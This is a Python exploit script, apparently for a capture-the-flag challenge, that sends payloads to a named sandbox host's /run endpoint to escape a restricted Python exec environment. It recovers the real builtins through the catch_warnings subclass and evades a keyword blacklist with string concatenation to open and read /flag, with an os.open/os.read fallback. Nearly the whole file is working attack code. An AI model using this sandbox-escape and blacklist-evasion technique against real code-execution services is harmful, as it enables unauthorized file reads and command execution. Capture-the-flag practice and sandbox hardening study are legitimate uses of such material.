#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""永远的魔法使 —— Python 沙箱逃逸（仅标准库）

目标: http://6a06qu5xkmh6vepz.neu-nex.fun

沙箱行为:
  POST /run  {"code": "..."}  ->  {"output": "..."}
  黑名单（子串匹配，命中即返回「检测到危险词: X」）:
    open, read, import, exec, eval, subprocess, system, popen, breakpoint, help, input
  exec 环境里的 __builtins__ 是**被裁剪过的 dict**（open / __import__ / eval 都已删除）。

逃逸:
  1) ().__class__.__base__.__subclasses__() 里能找到 warnings.catch_warnings 类；
  2) catch_warnings.__init__.__globals__['__builtins__'] 是解释器真正的 builtins（未被裁剪）；
  3) 用字符串拼接绕开子串黑名单：'op'+'en'、're'+'ad'、'__imp'+'ort__'；
  4) 读 /flag 后 print 出来。

用法:
  python exp.py             # 主路径：真 builtins + open/read
  python exp.py --os        # 备路径：真 builtins + __import__('os') + os.open/os.read
  python exp.py http://...  # 换实例
"""
import json
import re
import sys
import urllib.error
import urllib.request

BASE = "http://6a06qu5xkmh6vepz.neu-nex.fun"
ARGS = [a for a in sys.argv[1:] if not a.startswith("--")]
if ARGS:
    BASE = ARGS[0].rstrip("/")
USE_OS = "--os" in sys.argv

FLAG_RE = re.compile(r"(?:flag|nex|FLAG|NEX)\{[^}]{1,200}\}")

GET_REAL_BUILTINS = (
    "subs = ().__class__.__base__.__subclasses__()\n"
    "c = [x for x in subs if x.__name__ == 'catch_warnings'][0]\n"
    "b = c.__init__.__globals__['__builtins__']\n"
)

PAYLOAD_OPEN = GET_REAL_BUILTINS + (
    "f = b['op'+'en']('/flag')\n"
    "print(getattr(f, 're'+'ad')())"
)

PAYLOAD_OS = GET_REAL_BUILTINS + (
    "os = b['__imp'+'ort__']('os')\n"
    "fd = getattr(os, 'op'+'en')('/flag', 0)\n"
    "print(getattr(os, 're'+'ad')(fd, 200))"
)


def run(code):
    req = urllib.request.Request(
        BASE + "/run",
        data=json.dumps({"code": code}).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            return r.status, json.loads(r.read().decode("utf-8", "replace"))
    except urllib.error.HTTPError as e:
        return e.code, {"raw": e.read().decode("utf-8", "replace")}


def main():
    print("[*] target:", BASE)
    payload = PAYLOAD_OS if USE_OS else PAYLOAD_OPEN
    print("[*] mode:", "os.open/os.read" if USE_OS else "builtins open/read")
    st, data = run(payload)
    out = data.get("output", json.dumps(data, ensure_ascii=False))
    print("[*] HTTP", st, "->", out.strip()[:200])
    m = FLAG_RE.search(out)
    if m:
        print("[+] FLAG:", m.group(0))
        return 0
    print("[-] 未取到 flag（检查黑名单是否变化 / 实例是否存活）")
    return 1


if __name__ == "__main__":
    sys.exit(main())
